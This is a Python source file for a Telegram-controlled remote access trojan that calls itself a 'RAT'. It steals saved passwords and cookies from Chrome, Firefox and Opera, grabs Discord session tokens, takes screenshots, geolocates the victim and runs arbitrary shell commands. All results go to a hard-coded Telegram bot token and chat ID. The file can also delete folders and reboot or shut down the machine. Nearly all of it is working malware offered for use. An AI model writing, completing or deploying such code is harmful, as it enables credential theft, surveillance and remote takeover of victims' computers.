import telebot
import os
import requests
import shutil
import sqlite3
import subprocess
import platform
import webbrowser
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization
from json import loads
from PIL import ImageGrab
import base64
import keyring
import psutil
from psutil import virtual_memory, disk_partitions, disk_usage
import shlex
import logging
from pathlib import Path
import textwrap



# Telegram bot token and chat ID
bot_token = '7138392029:AAHYhtKxRywaejBNpHHFgiJq53jUY4yFfbM'  # Replace with your actual bot token
chat_id = '1567872776'      # Replace with your actual chat ID

bot = telebot.TeleBot(bot_token)

def handle_error(message, error):
    bot.send_message(message.chat.id, f'Error: {error}')

def decrypt_chrome_password(encrypted_password):
    try:
        # Decrypt Chrome passwords (note: this may require platform-specific details)
        backend = default_backend()
        key = b'peach'  # Replace with actual key retrieval
        cipher = Cipher(algorithms.AES(key), modes.CBC(b'1234567890123456'), backend=backend)
        decryptor = cipher.decryptor()
        decrypted_password = decryptor.update(encrypted_password) + decryptor.finalize()
        return decrypted_password.decode()
    except Exception as e:
        return f'Error decrypting password: {e}'

def Chrome_passwords():
    try:
        text = 'Chrome Passwords:\n'
        login_data_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
        if os.path.exists(login_data_path):
            temp_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data2')
            shutil.copy2(login_data_path, temp_path)
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            for result in cursor.fetchall():
                try:
                    password = decrypt_chrome_password(result[2])
                    login = result[1]
                    url = result[0]
                    if password:
                        text += f'URL: {url}\nLOGIN: {login}\nPASSWORD: {password}\n\n'
                except Exception as e:
                    text += f'Error decrypting password: {e}\n'
            conn.close()
            os.remove(temp_path)
        return text if text else 'No Chrome passwords found.'
    except Exception as e:
        return f'Error fetching Chrome passwords: {e}'

def Firefox_passwords():
    try:
        text = 'Firefox Passwords:\n'
        profiles_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
        for profile in os.listdir(profiles_path):
            logins_file = os.path.join(profiles_path, profile, 'logins.json')
            if os.path.exists(logins_file):
                with open(logins_file, 'r', encoding='utf-8') as file:
                    data = loads(file.read())
                    for login in data.get('logins', []):
                        text += f'URL: {login.get("hostname")}\nLOGIN: {login.get("username")}\nPASSWORD: {login.get("password")}\n\n'
        return text if text else 'No Firefox passwords found.'
    except Exception as e:
        return f'Error fetching Firefox passwords: {e}'

def Firefox_cookies():
    try:
        text = 'Firefox Cookies:\n'
        profiles_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
        for profile in os.listdir(profiles_path):
            cookies_file = os.path.join(profiles_path, profile, 'cookies.sqlite')
            if os.path.exists(cookies_file):
                conn = sqlite3.connect(cookies_file)
                cursor = conn.cursor()
                cursor.execute("SELECT host, name, value FROM moz_cookies")
                for result in cursor.fetchall():
                    text += f'URL: {result[0]} | COOKIE: {result[1]} | VALUE: {result[2]}\n'
                conn.close()
        return text if text else 'No Firefox cookies found.'
    except sqlite3.Error as e:
        return f'Error reading cookies: {e}'
    except Exception as e:
        return f'Error fetching Firefox cookies: {e}'

def Chrome_cookies():
    try:
        text = 'Chrome Cookies:\n'
        cookies_path = os.path.join(os.getenv("LOCALAPPDATA"), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')
        if os.path.exists(cookies_path):
            temp_path = os.path.join(os.getenv("LOCALAPPDATA"), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies2')
            shutil.copy2(cookies_path, temp_path)
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for result in cursor.fetchall():
                try:
                    cookie = decrypt_chrome_password(result[2])
                    name = result[1]
                    url = result[0]
                    text += f'URL: {url} | COOKIE: {cookie} | COOKIE NAME: {name}\n'
                except Exception as e:
                    text += f'Error decrypting cookie: {e}\n'
            conn.close()
            os.remove(temp_path)
        return text if text else 'No Chrome cookies found.'
    except Exception as e:
        return f'Error fetching Chrome cookies: {e}'

def Opera_passwords():
    try:
        text = 'Opera Passwords:\n'
        login_data_path = os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Login Data')
        if os.path.exists(login_data_path):
            temp_path = os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Login Data2')
            shutil.copy2(login_data_path, temp_path)
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            for result in cursor.fetchall():
                try:
                    password = decrypt_chrome_password(result[2])  # Opera uses the same format as Chrome
                    login = result[1]
                    url = result[0]
                    if password:
                        text += f'URL: {url}\nLOGIN: {login}\nPASSWORD: {password}\n\n'
                except Exception as e:
                    text += f'Error decrypting password: {e}\n'
            conn.close()
            os.remove(temp_path)
        return text if text else 'No Opera passwords found.'
    except Exception as e:
        return f'Error fetching Opera passwords: {e}'

def Opera_cookies():
    try:
        text = 'Opera Cookies:\n'
        cookies_path = os.path.join(os.getenv("APPDATA"), 'Opera Software', 'Opera Stable', 'Cookies')
        if os.path.exists(cookies_path):
            temp_path = os.path.join(os.getenv("APPDATA"), 'Opera Software', 'Opera Stable', 'Cookies2')
            shutil.copy2(cookies_path, temp_path)
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for result in cursor.fetchall():
                try:
                    cookie = decrypt_chrome_password(result[2])
                    name = result[1]
                    url = result[0]
                    text += f'URL: {url} | COOKIE: {cookie} | COOKIE NAME: {name}\n'
                except Exception as e:
                    text += f'Error decrypting cookie: {e}\n'
            conn.close()
            os.remove(temp_path)
        return text if text else 'No Opera cookies found.'
    except Exception as e:
        return f'Error fetching Opera cookies: {e}'

# Ensure Discord token retrieval uses correct decryption and paths
def discord_token():
    try:
        token = ''
        token_path = os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'https_discordapp.com_0.localstorage')
        if os.path.isfile(token_path):
            conn = sqlite3.connect(token_path)
            cursor = conn.cursor()
            cursor.execute('SELECT key, value FROM ItemTable WHERE key="token"')
            row = cursor.fetchone()
            if row:
                token = row[1].decode('utf-16')
            conn.close()
        return token if token else 'Discord token not found or not logged in.'
    except Exception as e:
        return f'Error fetching Discord token: {e}'






@bot.message_handler(commands=['info'])
def send_info(message):
    try:
        # Get username
        username = os.getlogin()
        
        # Get public IP address
        try:
            ip_response = requests.get('https://httpbin.org/ip')
            IP = ip_response.json().get('origin', 'Unknown IP')
        except requests.RequestException as e:
            IP = f'Error fetching IP address: {e}'
        
        # Get location data
        try:
            location_response = requests.get('http://ipinfo.io/json')
            location_info = location_response.json()
            ip = location_info.get('ip', 'Unknown IP')
            city = location_info.get('city', 'Unknown city')
            region = location_info.get('region', 'Unknown region')
            country = location_info.get('country', 'Unknown country')
            loc = location_info.get('loc', 'Unknown location').split(',')
            latitude = loc[0] if len(loc) > 0 else 'Unknown'
            longitude = loc[1] if len(loc) > 1 else 'Unknown'
            location_message = (
                f'IP Address: {ip}\n'
                f'Country: {country}\n'
                f'Region: {region}\n'
                f'City: {city}\n'
                f'Latitude: {latitude}\n'
                f'Longitude: {longitude}\n'
                f'Location: https://www.google.com/maps?q={latitude},{longitude}'
            )
        except requests.RequestException as e:
            location_message = f'Error fetching location: {e}'

        # Get OS and processor info
        os_info = platform.platform()
        processor = platform.processor()
        
        # Get system hardware information
        try:
            ram = virtual_memory().total / (1024 ** 3)  # Convert bytes to GB
            storage_info = ''
            for partition in disk_partitions(all=True):
                try:
                    # Check if partition is accessible
                    if os.path.exists(partition.mountpoint):
                        usage = disk_usage(partition.mountpoint)
                        free = usage.free / (1024 ** 3)  # Convert bytes to GB
                        total = usage.total / (1024 ** 3)  # Convert bytes to GB
                        usage_percent = usage.percent
                        storage_info += f'{partition.device}  {free:.0f}GB  {total:.0f}GB  {usage_percent}%\n'
                    else:
                        storage_info += f'{partition.device}  Error: Drive not accessible\n'
                except OSError as e:
                    storage_info += f'{partition.device}  Error: {e}\n'
        except ImportError:
            ram = 'Unknown'
            storage_info = 'Unable to retrieve storage info'
        
        # Format the info message
        info_message = (
            f'🛰️ Geo Data:\n'
            f'{location_message}\n\n'
            f'💻 Device Data:\n'
            f'Hostname: {os.getenv("COMPUTERNAME", "Unknown")}\n'
            f'Username: {username}\n'
            f'IP: {IP}\n'
            f'OS: {os_info}\n'
            f'Processor: {processor}\n'
            f'RAM: {ram:.1f} GB\n'
            f'STORAGE:\n{storage_info}'
        )
        
        # Send user info message
        bot.send_message(message.chat.id, info_message)
    except Exception as e:
        bot.send_message(message.chat.id, f'Error retrieving information: {e}')





@bot.message_handler(commands=['screen'])
def send_screen(message):
    try:
        bot.send_message(message.chat.id, 'Wait...')
        screen = ImageGrab.grab()
        screen_path = os.path.join(os.getenv('APPDATA'), 'Screenshot.jpg')
        screen.save(screen_path)
        with open(screen_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove(screen_path)
    except Exception as e:
        handle_error(message, e)

# def main_keyboard():
#     keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
#     keyboard.add('/commands', '/help')
#     return keyboard


@bot.message_handler(commands=['commands'])
def send_commands(message):
    bot.send_message(message.chat.id, 'Commands:\n\n'
                              '/commands - list of commands\n'
                              '/screen - screenshot\n'
                              '/info - info about user\n'
                              '/location - location on a map\n'
                              '/kill_process - kill the process (process.exe)\n'
                              '/reboot - reboot PC\n'
                              '/shutdown - shutdown PC\n'
                              '/pwd - know current directory\n'
                              '/passwords_chrome - Chrome passwords\n'
                              '/passwords_firefox - Firefox passwords\n'
                              '/cookies_chrome - Chrome cookies\n'
                              '/cookies_firefox - Firefox cookies\n'
                              '/passwords_opera - Opera passwords\n'
                              '/cookies_opera - Opera cookies\n'
                              '/get_discord - get token of Discord session\n'
                              '/cmd command - execute command in CMD\n'
                              '/open_url - open link\n'
                              '/ls - list all files and folders in directory\n'
                              '/cd - change directory\n'
                              '/download - download target device file\n'
                              '/rm_dir - delete folder\n'
                              '/help - about RAT')





@bot.message_handler(commands=['cmd'])
def cmd_command(message):
    try:
        # Extract the command
        command = message.text.split(' ', 1)[1]

        # Split the command to handle special characters like && properly
        args = shlex.split(command)

        # Execute the command
        result = subprocess.check_output(args, shell=True, stderr=subprocess.STDOUT).decode()

        # Define the maximum message length
        max_message_length = 4096

        # Split the result into chunks if it is too long
        if len(result) > max_message_length:
            chunks = textwrap.wrap(result, max_message_length)
            for chunk in chunks:
                bot.send_message(message.chat.id, chunk)
        else:
            bot.send_message(message.chat.id, result)
    except subprocess.CalledProcessError as e:
        error_message = f'Error executing command:\n{e.output.decode()}'
        if len(error_message) > max_message_length:
            chunks = textwrap.wrap(error_message, max_message_length)
            for chunk in chunks:
                bot.send_message(message.chat.id, chunk)
        else:
            bot.send_message(message.chat.id, error_message)
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')



@bot.message_handler(commands=['open_url'])
def open_url(message):
    try:
        url = message.text.split(' ', 1)[1]
        webbrowser.open(url)
        bot.send_message(message.chat.id, f'Opened URL: {url}')
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['ls'])
def list_files(message):
    try:
        path = os.getcwd()
        files = os.listdir(path)
        files_list = '\n'.join(files)
        bot.send_message(message.chat.id, f'Files and folders in {path}:\n{files_list}')
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['cd'])
def change_directory(message):
    try:
        path = message.text.split(' ', 1)[1]
        os.chdir(path)
        bot.send_message(message.chat.id, f'Changed directory to: {path}')
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['download'])
def download_file(message):
    try:
        url = message.text.split(' ', 1)[1]
        response = requests.get(url, stream=True)
        file_path = os.path.join(os.getenv('APPDATA'), 'downloaded_file')
        with open(file_path, 'wb') as file:
            shutil.copyfileobj(response.raw, file)
        with open(file_path, 'rb') as file:
            bot.send_document(message.chat.id, file)
        os.remove(file_path)
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['rm_dir'])
def remove_directory(message):
    try:
        path = message.text.split(' ', 1)[1]
        shutil.rmtree(path)
        bot.send_message(message.chat.id, f'Deleted folder: {path}')
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['location'])
def send_location(message):
    try:
        ip_response = requests.get('http://ipinfo.io/json')
        location_info = ip_response.json()
        ip = location_info.get('ip', 'Unknown IP')
        city = location_info.get('city', 'Unknown city')
        region = location_info.get('region', 'Unknown region')
        country = location_info.get('country', 'Unknown country')
        loc = location_info.get('loc', 'Unknown location').split(',')
        latitude = loc[0] if len(loc) > 0 else 'Unknown'
        longitude = loc[1] if len(loc) > 1 else 'Unknown'

        location_message = (
            f'IP Address: {ip}\n'
            f'City: {city}\n'
            f'Region: {region}\n'
            f'Country: {country}\n'
            f'Latitude: {latitude}\n'
            f'Longitude: {longitude}\n'
            f'Location: https://www.google.com/maps?q={latitude},{longitude}'
        )
        bot.send_message(message.chat.id, location_message)
    except requests.RequestException as e:
        bot.send_message(message.chat.id, f'Error fetching location: {e}')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error retrieving location: {e}')

@bot.message_handler(commands=['reboot'])
def reboot_pc(message):
    try:
        if platform.system() == 'Windows':
            subprocess.run(['shutdown', '/r', '/t', '0'])
        else:
            subprocess.run(['sudo', 'reboot'])
        bot.send_message(message.chat.id, 'Rebooting PC...')
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['shutdown'])
def shutdown_pc(message):
    try:
        if platform.system() == 'Windows':
            subprocess.run(['shutdown', '/s', '/t', '0'])
        else:
            subprocess.run(['sudo', 'shutdown', 'now'])
        bot.send_message(message.chat.id, 'Shutting down PC...')
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['pwd'])
def current_directory(message):
    try:
        path = os.getcwd()
        bot.send_message(message.chat.id, f'Current directory: {path}')
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['get_discord'])
def get_discord(message):
    try:
        token = discord_token()
        if token:
            bot.send_message(message.chat.id, f'Discord Token: {token}')
        else:
            bot.send_message(message.chat.id, 'Discord Token not found.')
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['help'])
def help_message(message):
    bot.send_message(message.chat.id, 'This is a Remote Administration Tool (RAT) bot.\n'
                              'Commands:\n\n'
                              '/screen - screenshot\n'
                              '/info - info about user\n'
                              '/location - location on a map\n'
                              '/kill_process - kill the process (process.exe)\n'
                              '/reboot - reboot PC\n'
                              '/shutdown - shutdown PC\n'
                              '/pwd - know current directory\n'
                              '/passwords_chrome - Chrome passwords\n'
                              '/passwords_firefox - Firefox passwords\n'
                              '/cookies_chrome - Chrome cookies\n'
                              '/cookies_firefox - Firefox cookies\n'
                              '/passwords_opera - Opera passwords\n'
                              '/cookies_opera - Opera cookies\n'
                              '/get_discord - get token of Discord session\n'
                              '/cmd command - execute command in CMD\n'
                              '/open_url - open link\n'
                              '/ls - list all files and folders in directory\n'
                              '/cd - change directory\n'
                              '/download - download target device file\n'
                              '/rm_dir - delete folder\n'
                              '/help - about RAT')

bot.polling()
